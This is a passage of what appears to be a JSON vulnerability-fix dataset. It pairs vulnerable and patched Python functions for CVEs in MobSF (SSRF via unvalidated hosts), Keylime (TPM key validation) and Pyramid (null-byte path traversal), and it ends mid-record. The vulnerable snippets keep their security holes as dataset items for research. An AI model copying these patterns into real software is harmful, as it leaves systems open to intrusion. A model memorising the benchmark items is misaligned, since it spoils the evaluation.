    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-29190",
    "cve_description": "Mobile Security Framework (MobSF) is a pen-testing, malware analysis and security assessment framework capable of performing static and dynamic analysis. In version 3.9.5 Beta and prior, MobSF does not perform any input validation when extracting the hostnames in `android:host`, so requests can also be sent to local hostnames. This can lead to server-side request forgery. An attacker can cause the server to make a connection to internal-only services within the organization's infrastructure. Commit 5a8eeee73c5f504a6c3abdf2a139a13804efdb77 has a hotfix for this issue.\n",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/MobSF/mobsfscan",
    "patch_url": [
      "https://github.com/MobSF/mobsfscan/commit/61fd40b477bbf9d204eb8c5a83a86c396d839798",
      "https://github.com/MobSF/mobsfscan/commit/cd01b71770a6e56c1c71b0e5f454e7b6c9c64ef4",
      "https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/5a8eeee73c5f504a6c3abdf2a139a13804efdb77"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_285_1",
        "commit": "e29e85c",
        "file_path": "mobsfscan/manifest.py",
        "start_line": 337,
        "end_line": 365,
        "snippet": "    def assetlinks_check(self, intent):\n        \"\"\"Well known assetlink check.\"\"\"\n        well_known_path = '/.well-known/assetlinks.json'\n        well_knowns = set()\n\n        applink_data = intent.get('data')\n        if isinstance(applink_data, dict):\n            applink_data = [applink_data]\n        elif not isinstance(applink_data, list):\n            return\n        for applink in applink_data:\n            host = applink.get('@android:host')\n            port = applink.get('@android:port')\n            scheme = applink.get('@android:scheme')\n            # Collect possible well-known paths\n            if scheme and scheme in ('http', 'https') and host:\n                host = host.replace('*.', '')\n                if port:\n                    c_url = f'{scheme}://{host}:{port}{well_known_path}'\n                else:\n                    c_url = f'{scheme}://{host}{well_known_path}'\n                well_knowns.add(c_url)\n        with ThreadPoolExecutor() as executor:\n            futures = []\n            for w_url in well_knowns:\n                futures.append(\n                    executor.submit(self.check_url, w_url))\n            for future in futures:\n                future.result()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_285_1",
        "commit": "61fd40b477bbf9d204eb8c5a83a86c396d839798",
        "file_path": "mobsfscan/manifest.py",
        "start_line": 341,
        "end_line": 374,
        "snippet": "    def assetlinks_check(self, intent):\n        \"\"\"Well known assetlink check.\"\"\"\n        well_known_path = '/.well-known/assetlinks.json'\n        well_knowns = set()\n\n        applink_data = intent.get('data')\n        if isinstance(applink_data, dict):\n            applink_data = [applink_data]\n        elif not isinstance(applink_data, list):\n            return\n        for applink in applink_data:\n            host = applink.get('@android:host')\n            port = applink.get('@android:port')\n            scheme = applink.get('@android:scheme')\n            # Collect possible well-known paths\n            if (scheme\n                    and scheme in ('http', 'https')\n                    and host\n                    and host != '*'):\n                host = host.replace('*.', '').replace('#', '')\n                if not valid_host(host):\n                    continue\n                if port and is_number(port):\n                    c_url = f'{scheme}://{host}:{port}{well_known_path}'\n                else:\n                    c_url = f'{scheme}://{host}{well_known_path}'\n                well_knowns.add(c_url)\n        with ThreadPoolExecutor() as executor:\n            futures = []\n            for w_url in well_knowns:\n                futures.append(\n                    executor.submit(self.check_url, w_url))\n            for future in futures:\n                future.result()"
      },
      {
        "id": "fix_py_285_2",
        "commit": "61fd40b477bbf9d204eb8c5a83a86c396d839798",
        "file_path": "mobsfscan/utils.py",
        "start_line": 120,
        "end_line": 135,
        "snippet": "def is_number(s):\n    if not s:\n        return False\n    if s == 'NaN':\n        return False\n    try:\n        float(s)\n        return True\n    except ValueError:\n        pass\n    try:\n        unicodedata.numeric(s)\n        return True\n    except (TypeError, ValueError):\n        pass\n    return False"
      },
      {
        "id": "fix_py_285_3",
        "commit": "61fd40b477bbf9d204eb8c5a83a86c396d839798",
        "file_path": "mobsfscan/utils.py",
        "start_line": 138,
        "end_line": 173,
        "snippet": "def valid_host(host):\n    \"\"\"Check if host is valid.\"\"\"\n    try:\n        prefixs = ('http://', 'https://')\n        if not host.startswith(prefixs):\n            host = f'http://{host}'\n        parsed = urlparse(host)\n        domain = parsed.netloc\n        path = parsed.path\n        if len(domain) == 0:\n            # No valid domain\n            return False\n        if len(path) > 0:\n            # Only host is allowed\n            return False\n        if ':' in domain:\n            # IPv6\n            return False\n        # Local network\n        invalid_prefix = (\n            '127.',\n            '192.',\n            '10.',\n            '172.',\n            '169',\n            '0.',\n            'localhost')\n        if domain.startswith(invalid_prefix):\n            return False\n        ip = socket.gethostbyname(domain)\n        if ip.startswith(invalid_prefix):\n            # Resolve dns to get IP\n            return False\n        return True\n    except Exception:\n        return False"
      }
    ],
    "vul_patch": "--- a/mobsfscan/manifest.py\n+++ b/mobsfscan/manifest.py\n@@ -13,9 +13,14 @@\n             port = applink.get('@android:port')\n             scheme = applink.get('@android:scheme')\n             # Collect possible well-known paths\n-            if scheme and scheme in ('http', 'https') and host:\n-                host = host.replace('*.', '')\n-                if port:\n+            if (scheme\n+                    and scheme in ('http', 'https')\n+                    and host\n+                    and host != '*'):\n+                host = host.replace('*.', '').replace('#', '')\n+                if not valid_host(host):\n+                    continue\n+                if port and is_number(port):\n                     c_url = f'{scheme}://{host}:{port}{well_known_path}'\n                 else:\n                     c_url = f'{scheme}://{host}{well_known_path}'\n\n--- /dev/null\n+++ b/mobsfscan/manifest.py\n@@ -0,0 +1,16 @@\n+def is_number(s):\n+    if not s:\n+        return False\n+    if s == 'NaN':\n+        return False\n+    try:\n+        float(s)\n+        return True\n+    except ValueError:\n+        pass\n+    try:\n+        unicodedata.numeric(s)\n+        return True\n+    except (TypeError, ValueError):\n+        pass\n+    return False\n\n--- /dev/null\n+++ b/mobsfscan/manifest.py\n@@ -0,0 +1,36 @@\n+def valid_host(host):\n+    \"\"\"Check if host is valid.\"\"\"\n+    try:\n+        prefixs = ('http://', 'https://')\n+        if not host.startswith(prefixs):\n+            host = f'http://{host}'\n+        parsed = urlparse(host)\n+        domain = parsed.netloc\n+        path = parsed.path\n+        if len(domain) == 0:\n+            # No valid domain\n+            return False\n+        if len(path) > 0:\n+            # Only host is allowed\n+            return False\n+        if ':' in domain:\n+            # IPv6\n+            return False\n+        # Local network\n+        invalid_prefix = (\n+            '127.',\n+            '192.',\n+            '10.',\n+            '172.',\n+            '169',\n+            '0.',\n+            'localhost')\n+        if domain.startswith(invalid_prefix):\n+            return False\n+        ip = socket.gethostbyname(domain)\n+        if ip.startswith(invalid_prefix):\n+            # Resolve dns to get IP\n+            return False\n+        return True\n+    except Exception:\n+        return False\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-1053",
    "cve_description": "Keylime does not enforce that the agent registrar data is the same when the tenant uses it for validation of the EK and identity quote and the verifier for validating the integrity quote. This allows an attacker to use one AK, EK pair from a real TPM to pass EK validation and give the verifier an AK of a software TPM. A successful attack breaks the entire chain of trust because a not validated AK is used by the verifier. This issue is worse if the validation happens first and then the agent gets added to the verifier because the timing is easier and the verifier does not validate the regcount entry being equal to 1,",
    "cwe_info": {
      "CWE-20": {
        "name": "Improper Input Validation",
        "description": "The product receives input or data, but it does\n        not validate or incorrectly validates that the input has the\n        properties that are required to process the data safely and\n        correctly."
      }
    },
    "repo": "https://github.com/keylime/keylime",
    "patch_url": [
      "https://github.com/keylime/keylime/commit/bd5de712acdd77860e7dc58969181e16c7a8dc5d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_299_1",
        "commit": "7631bbf",
        "file_path": "keylime/cloud_verifier_tornado.py",
        "start_line": 392,
        "end_line": 531,
        "snippet": "    def post(self):\n        \"\"\"This method handles the POST requests to add agents to the Cloud Verifier.\n\n        Currently, only agents resources are available for POSTing, i.e. /agents. All other POST uri's will return errors.\n        agents requests require a json block sent in the body\n        \"\"\"\n        session = get_session()\n        try:\n            rest_params = web_util.get_restful_params(self.request.uri)\n            if rest_params is None:\n                web_util.echo_json_response(\n                    self, 405, \"Not Implemented: Use /agents/ interface\")\n                return\n\n            if not web_util.validate_api_version(self, rest_params[\"api_version\"], logger):\n                return\n\n            if \"agents\" not in rest_params:\n                web_util.echo_json_response(self, 400, \"uri not supported\")\n                logger.warning('POST returning 400 response. uri not supported: %s', self.request.path)\n                return\n\n            agent_id = rest_params[\"agents\"]\n\n            if agent_id is not None:\n                # If the agent ID is not valid (wrong set of\n                # characters), just do nothing.\n                if not validators.valid_agent_id(agent_id):\n                    web_util.echo_json_response(self, 400, \"agent_id not not valid\")\n                    logger.error(\"POST received an invalid agent ID: %s\", agent_id)\n                    return\n\n                content_length = len(self.request.body)\n                if content_length == 0:\n                    web_util.echo_json_response(\n                        self, 400, \"Expected non zero content length\")\n                    logger.warning('POST returning 400 response. Expected non zero content length.')\n                else:\n                    json_body = json.loads(self.request.body)\n                    agent_data = {}\n                    agent_data['v'] = json_body['v']\n                    agent_data['ip'] = json_body['cloudagent_ip']\n                    agent_data['port'] = int(json_body['cloudagent_port'])\n                    agent_data['operational_state'] = states.START\n                    agent_data['public_key'] = \"\"\n                    agent_data['tpm_policy'] = json_body['tpm_policy']\n                    agent_data['meta_data'] = json_body['metadata']\n                    agent_data['allowlist'] = json_body['allowlist']\n                    agent_data['mb_refstate'] = json_body['mb_refstate']\n                    agent_data['ima_sign_verification_keys'] = json_body['ima_sign_verification_keys']\n                    agent_data['revocation_key'] = json_body['revocation_key']\n                    agent_data['accept_tpm_hash_algs'] = json_body['accept_tpm_hash_algs']\n                    agent_data['accept_tpm_encryption_algs'] = json_body['accept_tpm_encryption_algs']\n                    agent_data['accept_tpm_signing_algs'] = json_body['accept_tpm_signing_algs']\n                    agent_data['supported_version'] = json_body['supported_version']\n                    agent_data['hash_alg'] = \"\"\n                    agent_data['enc_alg'] = \"\"\n                    agent_data['sign_alg'] = \"\"\n                    agent_data['agent_id'] = agent_id\n                    agent_data['boottime'] = 0\n                    agent_data['ima_pcrs'] = []\n                    agent_data['pcr10'] = None\n                    agent_data['next_ima_ml_entry'] = 0\n                    agent_data['learned_ima_keyrings'] = {}\n                    agent_data['verifier_id'] = config.get('cloud_verifier', 'cloudverifier_id', fallback=cloud_verifier_common.DEFAULT_VERIFIER_ID)\n                    agent_data['verifier_ip'] = config.get('cloud_verifier', 'cloudverifier_ip')\n                    agent_data['verifier_port'] = config.get('cloud_verifier', 'cloudverifier_port')\n\n                    # We fetch the registrar data directly here because we require it for connecting to the agent\n                    # using mTLS\n                    registrar_client.init_client_tls('cloud_verifier')\n                    registrar_data = registrar_client.getData(config.get(\"cloud_verifier\", \"registrar_ip\"),\n                                                              config.get(\"cloud_verifier\", \"registrar_port\"), agent_id)\n                    if registrar_data is None:\n                        web_util.echo_json_response(self, 400,\n                                                    f\"Data for agent {agent_id} could not be found in registrar!\")\n                        logger.warning(\"Data for agent %s could not be found in registrar!\", agent_id)\n                        return\n\n                    agent_data['mtls_cert'] = registrar_data.get('mtls_cert', None)\n                    agent_data['ak_tpm'] = registrar_data['aik_tpm']\n\n                    # TODO: Always error for v1.0 version after initial upgrade\n                    if registrar_data.get('mtls_cert', None) is None and agent_data['supported_version'] != \"1.0\":\n                        web_util.echo_json_response(self, 400, \"mTLS certificate for agent is required!\")\n                        return\n\n                    is_valid, err_msg = cloud_verifier_common.validate_agent_data(agent_data)\n                    if not is_valid:\n                        web_util.echo_json_response(self, 400, err_msg)\n                        logger.warning(err_msg)\n                        return\n\n                    try:\n                        new_agent_count = session.query(\n                            VerfierMain).filter_by(agent_id=agent_id).count()\n                    except SQLAlchemyError as e:\n                        logger.error('SQLAlchemy Error: %s', e)\n                        raise e\n\n                    # don't allow overwriting\n\n                    if new_agent_count > 0:\n                        web_util.echo_json_response(\n                            self, 409, f\"Agent of uuid {agent_id} already exists\")\n                        logger.warning(\"Agent of uuid %s already exists\", agent_id)\n                    else:\n                        try:\n                            # Add the agent and data\n                            session.add(VerfierMain(**agent_data))\n                            session.commit()\n                        except SQLAlchemyError as e:\n                            logger.error('SQLAlchemy Error: %s', e)\n                            raise e\n\n                        # add default fields that are ephemeral\n                        for key,val in exclude_db.items():\n                            agent_data[key] = val\n\n                        # Prepare SSLContext for mTLS connections\n                        agent_mtls_cert_enabled = config.getboolean('cloud_verifier', 'agent_mtls_cert_enabled', fallback=False)\n                        mtls_cert = registrar_data.get('mtls_cert', None)\n                        agent_data['ssl_context'] = None\n                        if agent_mtls_cert_enabled and mtls_cert:\n                            agent_data['ssl_context'] = web_util.generate_agent_mtls_context(mtls_cert, self.mtls_options)\n\n                        if agent_data['ssl_context'] is None:\n                            logger.warning('Connecting to agent without mTLS: %s', agent_id)\n\n                        asyncio.ensure_future(\n                            process_agent(agent_data, states.GET_QUOTE))\n                        web_util.echo_json_response(self, 200, \"Success\")\n                        logger.info('POST returning 200 response for adding agent id: %s', agent_id)\n            else:\n                web_util.echo_json_response(self, 400, \"uri not supported\")\n                logger.warning(\"POST returning 400 response. uri not supported\")\n        except Exception as e:\n            web_util.echo_json_response(self, 400, f\"Exception error: {str(e)}\")\n            logger.warning(\"POST returning 400 response. Exception error: %s\", e)\n            logger.exception(e)"
      },
      {
        "id": "vul_py_299_2",
        "commit": "7631bbf",
        "file_path": "keylime/cloud_verifier_tornado.py",
        "start_line": 616,
        "end_line": 660,
        "snippet": "class AllowlistHandler(BaseHandler):\n    def head(self):\n        web_util.echo_json_response(\n            self, 400, \"Allowlist handler: HEAD Not Implemented\")\n\n    def get(self):\n        \"\"\"Get an allowlist\n\n        GET /allowlists/{name}\n        \"\"\"\n\n        rest_params = web_util.get_restful_params(self.request.uri)\n        if rest_params is None or 'allowlists' not in rest_params:\n            web_util.echo_json_response(self, 400, \"Invalid URL\")\n            return\n\n        if not web_util.validate_api_version(self, rest_params[\"api_version\"], logger):\n            return\n\n        allowlist_name = rest_params['allowlists']\n        if allowlist_name is None:\n            web_util.echo_json_response(self, 400, \"Invalid URL\")\n            logger.warning(\n                'GET returning 400 response: %s', self.request.path)\n            return\n\n        session = get_session()\n        try:\n            allowlist = session.query(VerifierAllowlist).filter_by(\n                name=allowlist_name).one()\n        except NoResultFound:\n            web_util.echo_json_response(self, 404, f\"Allowlist {allowlist_name} not found\")\n            return\n        except SQLAlchemyError as e:\n            logger.error('SQLAlchemy Error: %s', e)\n            web_util.echo_json_response(self, 500, \"Failed to get allowlist\")\n            raise\n\n        response = {}\n        for field in ('name', 'tpm_policy', 'ima_policy'):\n            response[field] = getattr(allowlist, field, None)\n        web_util.echo_json_response(self, 200, 'Success', response)\n\n    def delete(self):\n        \"\"\"Delete an allowlist"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_299_1",
        "commit": "bd5de712acdd77860e7dc58969181e16c7a8dc5d",
        "file_path": "keylime/cloud_verifier_tornado.py",
        "start_line": 391,
        "end_line": 518,
        "snippet": "    def post(self):\n        \"\"\"This method handles the POST requests to add agents to the Cloud Verifier.\n\n        Currently, only agents resources are available for POSTing, i.e. /agents. All other POST uri's will return errors.\n        agents requests require a json block sent in the body\n        \"\"\"\n        session = get_session()\n        try:\n            rest_params = web_util.get_restful_params(self.request.uri)\n            if rest_params is None:\n                web_util.echo_json_response(\n                    self, 405, \"Not Implemented: Use /agents/ interface\")\n                return\n\n            if not web_util.validate_api_version(self, rest_params[\"api_version\"], logger):\n                return\n\n            if \"agents\" not in rest_params:\n                web_util.echo_json_response(self, 400, \"uri not supported\")\n                logger.warning('POST returning 400 response. uri not supported: %s', self.request.path)\n                return\n\n            agent_id = rest_params[\"agents\"]\n\n            if agent_id is not None:\n                # If the agent ID is not valid (wrong set of\n                # characters), just do nothing.\n                if not validators.valid_agent_id(agent_id):\n                    web_util.echo_json_response(self, 400, \"agent_id not not valid\")\n                    logger.error(\"POST received an invalid agent ID: %s\", agent_id)\n                    return\n\n                content_length = len(self.request.body)\n                if content_length == 0:\n                    web_util.echo_json_response(\n                        self, 400, \"Expected non zero content length\")\n                    logger.warning('POST returning 400 response. Expected non zero content length.')\n                else:\n                    json_body = json.loads(self.request.body)\n                    agent_data = {}\n                    agent_data['v'] = json_body['v']\n                    agent_data['ip'] = json_body['cloudagent_ip']\n                    agent_data['port'] = int(json_body['cloudagent_port'])\n                    agent_data['operational_state'] = states.START\n                    agent_data['public_key'] = \"\"\n                    agent_data['tpm_policy'] = json_body['tpm_policy']\n                    agent_data['meta_data'] = json_body['metadata']\n                    agent_data['allowlist'] = json_body['allowlist']\n                    agent_data['mb_refstate'] = json_body['mb_refstate']\n                    agent_data['ima_sign_verification_keys'] = json_body['ima_sign_verification_keys']\n                    agent_data['revocation_key'] = json_body['revocation_key']\n                    agent_data['accept_tpm_hash_algs'] = json_body['accept_tpm_hash_algs']\n                    agent_data['accept_tpm_encryption_algs'] = json_body['accept_tpm_encryption_algs']\n                    agent_data['accept_tpm_signing_algs'] = json_body['accept_tpm_signing_algs']\n                    agent_data['supported_version'] = json_body['supported_version']\n                    agent_data['ak_tpm'] = json_body['ak_tpm']\n                    agent_data['mtls_cert'] = json_body.get('mtls_cert', None)\n                    agent_data['hash_alg'] = \"\"\n                    agent_data['enc_alg'] = \"\"\n                    agent_data['sign_alg'] = \"\"\n                    agent_data['agent_id'] = agent_id\n                    agent_data['boottime'] = 0\n                    agent_data['ima_pcrs'] = []\n                    agent_data['pcr10'] = None\n                    agent_data['next_ima_ml_entry'] = 0\n                    agent_data['learned_ima_keyrings'] = {}\n                    agent_data['verifier_id'] = config.get('cloud_verifier', 'cloudverifier_id', fallback=cloud_verifier_common.DEFAULT_VERIFIER_ID)\n                    agent_data['verifier_ip'] = config.get('cloud_verifier', 'cloudverifier_ip')\n                    agent_data['verifier_port'] = config.get('cloud_verifier', 'cloudverifier_port')\n\n                    # TODO: Always error for v1.0 version after initial upgrade\n                    if agent_data['mtls_cert'] is None and agent_data['supported_version'] != \"1.0\":\n                        web_util.echo_json_response(self, 400, \"mTLS certificate for agent is required!\")\n                        return\n\n                    is_valid, err_msg = cloud_verifier_common.validate_agent_data(agent_data)\n                    if not is_valid:\n                        web_util.echo_json_response(self, 400, err_msg)\n                        logger.warning(err_msg)\n                        return\n\n                    try:\n                        new_agent_count = session.query(\n                            VerfierMain).filter_by(agent_id=agent_id).count()\n                    except SQLAlchemyError as e:\n                        logger.error('SQLAlchemy Error: %s', e)\n                        raise e\n\n                    # don't allow overwriting\n\n                    if new_agent_count > 0:\n                        web_util.echo_json_response(\n                            self, 409, f\"Agent of uuid {agent_id} already exists\")\n                        logger.warning(\"Agent of uuid %s already exists\", agent_id)\n                    else:\n                        try:\n                            # Add the agent and data\n                            session.add(VerfierMain(**agent_data))\n                            session.commit()\n                        except SQLAlchemyError as e:\n                            logger.error('SQLAlchemy Error: %s', e)\n                            raise e\n\n                        # add default fields that are ephemeral\n                        for key,val in exclude_db.items():\n                            agent_data[key] = val\n\n                        # Prepare SSLContext for mTLS connections\n                        agent_mtls_cert_enabled = config.getboolean('cloud_verifier', 'agent_mtls_cert_enabled', fallback=False)\n                        mtls_cert = agent_data['mtls_cert']\n                        agent_data['ssl_context'] = None\n                        if agent_mtls_cert_enabled and mtls_cert:\n                            agent_data['ssl_context'] = web_util.generate_agent_mtls_context(mtls_cert, self.mtls_options)\n\n                        if agent_data['ssl_context'] is None:\n                            logger.warning('Connecting to agent without mTLS: %s', agent_id)\n\n                        asyncio.ensure_future(\n                            process_agent(agent_data, states.GET_QUOTE))\n                        web_util.echo_json_response(self, 200, \"Success\")\n                        logger.info('POST returning 200 response for adding agent id: %s', agent_id)\n            else:\n                web_util.echo_json_response(self, 400, \"uri not supported\")\n                logger.warning(\"POST returning 400 response. uri not supported\")\n        except Exception as e:\n            web_util.echo_json_response(self, 400, f\"Exception error: {str(e)}\")\n            logger.warning(\"POST returning 400 response. Exception error: %s\", e)\n            logger.exception(e)"
      },
      {
        "id": "fix_py_299_2",
        "commit": "bd5de712acdd77860e7dc58969181e16c7a8dc5d",
        "file_path": "keylime/cloud_verifier_tornado.py",
        "start_line": 616,
        "end_line": 662,
        "snippet": "            web_util.echo_json_response(self, 400, \"Invalid URL\")\n            return\n\n        if not web_util.validate_api_version(self, rest_params[\"api_version\"], logger):\n            return\n\n        allowlist_name = rest_params['allowlists']\n        if allowlist_name is None:\n            web_util.echo_json_response(self, 400, \"Invalid URL\")\n            logger.warning(\n                'GET returning 400 response: %s', self.request.path)\n            return\n\n        session = get_session()\n        try:\n            allowlist = session.query(VerifierAllowlist).filter_by(\n                name=allowlist_name).one()\n        except NoResultFound:\n            web_util.echo_json_response(self, 404, f\"Allowlist {allowlist_name} not found\")\n            return\n        except SQLAlchemyError as e:\n            logger.error('SQLAlchemy Error: %s', e)\n            web_util.echo_json_response(self, 500, \"Failed to get allowlist\")\n            raise\n\n        response = {}\n        for field in ('name', 'tpm_policy', 'ima_policy'):\n            response[field] = getattr(allowlist, field, None)\n        web_util.echo_json_response(self, 200, 'Success', response)\n\n    def delete(self):\n        \"\"\"Delete an allowlist\n\n        DELETE /allowlists/{name}\n        \"\"\"\n\n        rest_params = web_util.get_restful_params(self.request.uri)\n        if rest_params is None or 'allowlists' not in rest_params:\n            web_util.echo_json_response(self, 400, \"Invalid URL\")\n            return\n\n        if not web_util.validate_api_version(self, rest_params[\"api_version\"], logger):\n            return\n\n        allowlist_name = rest_params['allowlists']\n        if allowlist_name is None:\n            web_util.echo_json_response(self, 400, \"Invalid URL\")"
      }
    ],
    "vul_patch": "--- a/keylime/cloud_verifier_tornado.py\n+++ b/keylime/cloud_verifier_tornado.py\n@@ -53,6 +53,8 @@\n                     agent_data['accept_tpm_encryption_algs'] = json_body['accept_tpm_encryption_algs']\n                     agent_data['accept_tpm_signing_algs'] = json_body['accept_tpm_signing_algs']\n                     agent_data['supported_version'] = json_body['supported_version']\n+                    agent_data['ak_tpm'] = json_body['ak_tpm']\n+                    agent_data['mtls_cert'] = json_body.get('mtls_cert', None)\n                     agent_data['hash_alg'] = \"\"\n                     agent_data['enc_alg'] = \"\"\n                     agent_data['sign_alg'] = \"\"\n@@ -66,22 +68,8 @@\n                     agent_data['verifier_ip'] = config.get('cloud_verifier', 'cloudverifier_ip')\n                     agent_data['verifier_port'] = config.get('cloud_verifier', 'cloudverifier_port')\n \n-                    # We fetch the registrar data directly here because we require it for connecting to the agent\n-                    # using mTLS\n-                    registrar_client.init_client_tls('cloud_verifier')\n-                    registrar_data = registrar_client.getData(config.get(\"cloud_verifier\", \"registrar_ip\"),\n-                                                              config.get(\"cloud_verifier\", \"registrar_port\"), agent_id)\n-                    if registrar_data is None:\n-                        web_util.echo_json_response(self, 400,\n-                                                    f\"Data for agent {agent_id} could not be found in registrar!\")\n-                        logger.warning(\"Data for agent %s could not be found in registrar!\", agent_id)\n-                        return\n-\n-                    agent_data['mtls_cert'] = registrar_data.get('mtls_cert', None)\n-                    agent_data['ak_tpm'] = registrar_data['aik_tpm']\n-\n                     # TODO: Always error for v1.0 version after initial upgrade\n-                    if registrar_data.get('mtls_cert', None) is None and agent_data['supported_version'] != \"1.0\":\n+                    if agent_data['mtls_cert'] is None and agent_data['supported_version'] != \"1.0\":\n                         web_util.echo_json_response(self, 400, \"mTLS certificate for agent is required!\")\n                         return\n \n@@ -119,7 +107,7 @@\n \n                         # Prepare SSLContext for mTLS connections\n                         agent_mtls_cert_enabled = config.getboolean('cloud_verifier', 'agent_mtls_cert_enabled', fallback=False)\n-                        mtls_cert = registrar_data.get('mtls_cert', None)\n+                        mtls_cert = agent_data['mtls_cert']\n                         agent_data['ssl_context'] = None\n                         if agent_mtls_cert_enabled and mtls_cert:\n                             agent_data['ssl_context'] = web_util.generate_agent_mtls_context(mtls_cert, self.mtls_options)\n\n--- a/keylime/cloud_verifier_tornado.py\n+++ b/keylime/cloud_verifier_tornado.py\n@@ -1,16 +1,3 @@\n-class AllowlistHandler(BaseHandler):\n-    def head(self):\n-        web_util.echo_json_response(\n-            self, 400, \"Allowlist handler: HEAD Not Implemented\")\n-\n-    def get(self):\n-        \"\"\"Get an allowlist\n-\n-        GET /allowlists/{name}\n-        \"\"\"\n-\n-        rest_params = web_util.get_restful_params(self.request.uri)\n-        if rest_params is None or 'allowlists' not in rest_params:\n             web_util.echo_json_response(self, 400, \"Invalid URL\")\n             return\n \n@@ -43,3 +30,18 @@\n \n     def delete(self):\n         \"\"\"Delete an allowlist\n+\n+        DELETE /allowlists/{name}\n+        \"\"\"\n+\n+        rest_params = web_util.get_restful_params(self.request.uri)\n+        if rest_params is None or 'allowlists' not in rest_params:\n+            web_util.echo_json_response(self, 400, \"Invalid URL\")\n+            return\n+\n+        if not web_util.validate_api_version(self, rest_params[\"api_version\"], logger):\n+            return\n+\n+        allowlist_name = rest_params['allowlists']\n+        if allowlist_name is None:\n+            web_util.echo_json_response(self, 400, \"Invalid URL\")\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-40587",
    "cve_description": "Pyramid is an open source Python web framework. A path traversal vulnerability in Pyramid versions 2.0.0 and 2.0.1 impacts users of Python 3.11 that are using a Pyramid static view with a full filesystem path and have a `index.html` file that is located exactly one directory above the location of the static view's file system path. No further path traversal exists, and the only file that could be disclosed accidentally is `index.html`. Pyramid version 2.0.2 rejects any path that contains a null-byte out of caution. While valid in directory/file names, we would strongly consider it a mistake to use null-bytes in naming files/directories. Secondly, Python 3.11, and 3.12 has fixed the underlying issue in `os.path.normpath` to no longer truncate on the first `0x00` found, returning the behavior to pre-3.11 Python, un an as of yet unreleased version. Fixes will be available in:Python 3.12.0rc2 and 3.11.5. Some workarounds are available. Use a version of Python 3 that is not affected, downgrade to Python 3.10 series temporarily, or wait until Python 3.11.5 is released and upgrade to the latest version of Python 3.11 series.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/Pylons/pyramid",
    "patch_url": [
      "https://github.com/Pylons/pyramid/commit/347d7750da6f45c7436dd0c31468885cc9343c85"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_309_1",
        "commit": "9cd83a2",
        "file_path": "src/pyramid/static.py",
        "start_line": 263,
        "end_line": 263,
        "snippet": "_seps = {'/', os.sep}"
      },
      {
        "id": "vul_py_309_2",
        "commit": "9cd83a2",
        "file_path": "src/pyramid/static.py",
        "start_line": 266,
        "end_line": 269,
        "snippet": "def _contains_slash(item):\n    for sep in _seps:\n        if sep in item:\n            return True"
      },
      {
        "id": "vul_py_309_3",
        "commit": "9cd83a2",
        "file_path": "src/pyramid/static.py",
        "start_line": 276,
        "end_line": 285,
        "snippet": "def _secure_path(path_tuple):\n    if _has_insecure_pathelement(path_tuple):\n        # belt-and-suspenders security; this should never be true\n        # unless someone screws up the traversal_path code\n        # (request.subpath is computed via traversal_path too)\n        return None\n    if any([_contains_slash(item) for item in path_tuple]):\n        return None\n    encoded = '/'.join(path_tuple)  # will be unicode\n    return encoded"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_309_1",
        "commit": "347d7750da6f45c7436dd0c31468885cc9343c85",
        "file_path": "src/pyramid/static.py",
        "start_line": 263,
        "end_line": 263,
        "snippet": "_invalid_element_chars = {'/', os.sep, '\\x00'}"
      },
      {
        "id": "fix_py_309_2",
        "commit": "347d7750da6f45c7436dd0c31468885cc9343c85",
        "file_path": "src/pyramid/static.py",
        "start_line": 266,
        "end_line": 269,
        "snippet": "def _contains_invalid_element_char(item):\n    for invalid_element_char in _invalid_element_chars:\n        if invalid_element_char in item:\n            return True"
      },
      {
        "id": "fix_py_309_3",
        "commit": "347d7750da6f45c7436dd0c31468885cc9343c85",
        "file_path": "src/pyramid/static.py",
        "start_line": 276,
        "end_line": 285,
        "snippet": "def _secure_path(path_tuple):\n    if _has_insecure_pathelement(path_tuple):\n        # belt-and-suspenders security; this should never be true\n        # unless someone screws up the traversal_path code\n        # (request.subpath is computed via traversal_path too)\n        return None\n    if any([_contains_invalid_element_char(item) for item in path_tuple]):\n        return None\n    encoded = '/'.join(path_tuple)  # will be unicode\n    return encoded"
      }
    ],
    "vul_patch": "--- a/src/pyramid/static.py\n+++ b/src/pyramid/static.py\n@@ -1 +1 @@\n-_seps = {'/', os.sep}\n+_invalid_element_chars = {'/', os.sep, '\\x00'}\n\n--- a/src/pyramid/static.py\n+++ b/src/pyramid/static.py\n@@ -1,4 +1,4 @@\n-def _contains_slash(item):\n-    for sep in _seps:\n-        if sep in item:\n+def _contains_invalid_element_char(item):\n+    for invalid_element_char in _invalid_element_chars:\n+        if invalid_element_char in item:\n             return True\n\n--- a/src/pyramid/static.py\n+++ b/src/pyramid/static.py\n@@ -4,7 +4,7 @@\n         # unless someone screws up the traversal_path code\n         # (request.subpath is computed via traversal_path too)\n         return None\n-    if any([_contains_slash(item) for item in path_tuple]):\n+    if any([_contains_invalid_element_char(item) for item in path_tuple]):\n         return None\n     encoded = '/'.join(path_tuple)  # will be unicode\n     return encoded\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2017-14696",
    "cve_description": "SaltStack Salt before 2016.3.8, 2016.11.x before 2016.11.8, and 2017.7.x before 2017.7.2 allows remote attackers to cause a denial of service via a crafted authentication request.",
    "cwe_info": {
      "CWE-20": {
        "name": "Improper Input Validation",
